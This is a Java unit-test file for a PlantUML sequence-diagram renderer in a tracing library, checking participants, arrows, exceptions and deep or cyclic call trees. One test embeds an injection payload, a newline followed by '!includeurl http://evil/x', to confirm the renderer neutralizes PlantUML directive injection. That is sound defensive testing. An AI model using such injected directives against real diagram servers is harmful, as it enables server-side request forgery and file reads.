/*
 * Copyright (c) 2026 Empower Agile
 *
 * SPDX-License-Identifier: BUSL-1.1
 * Licensed under the Business Source License 1.1 (see LICENSE); Change Date: four
 * years from publication; Change License: Apache-2.0
 */
package ai.narrativetrace.diagrams;

import static org.assertj.core.api.Assertions.assertThat;

import ai.narrativetrace.api.event.MethodSignature;
import ai.narrativetrace.api.event.ParameterCapture;
import ai.narrativetrace.api.event.RenderedValue;
import ai.narrativetrace.api.event.TraceNode;
import ai.narrativetrace.api.event.TraceOutcome;
import ai.narrativetrace.core.tree.DefaultTraceTree;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class PlantUmlSequenceDiagramRendererTest {

  private final PlantUmlSequenceDiagramRenderer renderer = new PlantUmlSequenceDiagramRenderer();

  @Test
  void summarizesCollectionReturnAsCountPlusNoun() {
    var list =
        new RenderedValue.ListVal(
            List.of(
                new RenderedValue.ObjectVal("Transfer", Map.of()),
                new RenderedValue.ObjectVal("Transfer", Map.of())));
    var node =
        new TraceNode(
            new MethodSignature("Ledger", "expensesOf", List.of()),
            List.of(),
            new TraceOutcome.Returned("[huge rendered collection payload...]", list),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("Ledger --> Ledger: 2 transfers");
    assertThat(diagram).doesNotContain("huge rendered collection payload");
  }

  @Test
  void voidMethodRendersCompletionMarkInsteadOfNull() {
    var node =
        new TraceNode(
            new MethodSignature(
                "AuditSink", "record", List.of(new ParameterCapture("entry", "\"e\"", false))),
            List.of(),
            new TraceOutcome.Returned(null),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("\u2713");
    assertThat(diagram).doesNotContain("null");
  }

  @Test
  void rendersEquivalentPlantUmlSyntax() {
    var child =
        new TraceNode(
            new MethodSignature(
                "InventoryService",
                "checkStock",
                List.of(new ParameterCapture("sku", "\"SKU-1\"", false))),
            List.of(),
            new TraceOutcome.Returned("true"),
            5_000_000L);
    var root =
        new TraceNode(
            new MethodSignature(
                "OrderService",
                "placeOrder",
                List.of(new ParameterCapture("orderId", "\"O-123\"", false))),
            List.of(child),
            new TraceOutcome.Returned("\"OK\""),
            20_000_000L);
    var tree = new DefaultTraceTree(List.of(root));

    var diagram = renderer.render(tree);

    assertThat(diagram).startsWith("@startuml");
    assertThat(diagram).endsWith("@enduml");
    assertThat(diagram).contains("participant OrderService");
    assertThat(diagram).contains("participant InventoryService");
    assertThat(diagram).contains("OrderService -> OrderService: placeOrder(orderId)");
    assertThat(diagram).contains("OrderService -> InventoryService: checkStock(sku)");
    assertThat(diagram).contains("InventoryService --> OrderService: true");
    assertThat(diagram).contains("OrderService --> OrderService: \"OK\"");
  }

  @Test
  void rendersExceptionWithRedArrow() {
    var node =
        new TraceNode(
            new MethodSignature("PaymentService", "charge", List.of()),
            List.of(),
            new TraceOutcome.Threw(new RuntimeException("fail")),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("PaymentService -[#red]-> PaymentService: RuntimeException");
  }

  @Test
  void rendersNullReturnValueAsNull() {
    var node =
        new TraceNode(
            new MethodSignature("OrderService", "findOrder", List.of()),
            List.of(),
            new TraceOutcome.Returned("null"),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("OrderService --> OrderService: null");
  }

  @Test
  void rendersParticipantWithDotsInQuotes() {
    var node =
        new TraceNode(
            new MethodSignature("com.example.OrderService", "placeOrder", List.of()),
            List.of(),
            new TraceOutcome.Returned("\"OK\""),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("participant \"com.example.OrderService\"");
    assertThat(diagram)
        .contains("\"com.example.OrderService\" -> \"com.example.OrderService\": placeOrder()");
  }

  @Test
  void rendersIncompleteOutcomeAsHnoteOver() {
    var node =
        new TraceNode(
            new MethodSignature("OrderService", "placeOrder", List.of()),
            List.of(),
            new TraceOutcome.Incomplete(),
            0L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("hnote over OrderService : in-flight");
    assertThat(diagram).doesNotContain("-->"); // no return arrow
  }

  @Test
  void rendersMultipleParametersJoinedWithComma() {
    var node =
        new TraceNode(
            new MethodSignature(
                "OrderService",
                "placeOrder",
                List.of(
                    new ParameterCapture("orderId", "\"O-1\"", false),
                    new ParameterCapture("customerId", "\"C-1\"", false))),
            List.of(),
            new TraceOutcome.Returned("\"OK\""),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("OrderService -> OrderService: placeOrder(orderId, customerId)");
  }

  @Test
  void neutralizesNewlineInReturnValueToPreventPreprocessorDirectiveInjection() {
    // ValueRenderer preserves '\n', so a returned String embedding a newline followed by a PlantUML
    // preprocessor directive (!include / !includeurl) would inject that directive on its own line —
    // an SSRF / local-file-read primitive on a PlantUML server with includes enabled.
    var node =
        new TraceNode(
            new MethodSignature("ServiceA", "run", List.of()),
            List.of(),
            new TraceOutcome.Returned("\"ok\n!includeurl http://evil/x\""),
            1_000_000L);
    var tree = new DefaultTraceTree(List.of(node));

    var diagram = renderer.render(tree);

    assertThat(diagram.lines()).noneMatch(line -> line.stripLeading().startsWith("!include"));
  }

  private static TraceNode leaf(String className, String methodName, List<TraceNode> children) {
    return new TraceNode(
        new MethodSignature(className, methodName, List.of()),
        children,
        new TraceOutcome.Returned("\"ok\""));
  }

  @Test
  void aVeryDeepCallTreeRendersWithoutStackOverflow() {
    TraceNode current = leaf("Recursive", "call5000", List.of());
    for (var i = 0; i < 5_000; i++) {
      current = leaf("Recursive", "call" + i, List.of(current));
    }
    var tree = new DefaultTraceTree(List.of(current));

    var diagram = renderer.render(tree);

    assertThat(diagram).startsWith("@startuml");
    assertThat(diagram).contains("Recursive -> Recursive: call0()");
  }

  @Test
  void aCyclicCallTreeRendersEveryNodeOnceWithACycleMarkerAndNeverHangs() {
    var childHolder = new java.util.ArrayList<TraceNode>();
    var b = leaf("Ring", "b", childHolder);
    var a = leaf("Ring", "a", List.of(b));
    childHolder.add(a);
    var tree = new DefaultTraceTree(List.of(a));

    var diagram = renderer.render(tree);

    assertThat(diagram).contains("Ring -> Ring: a()");
    assertThat(diagram).contains("Ring -> Ring: b()");
    assertThat(diagram).contains("hnote over Ring : … (cycle)");
  }
}
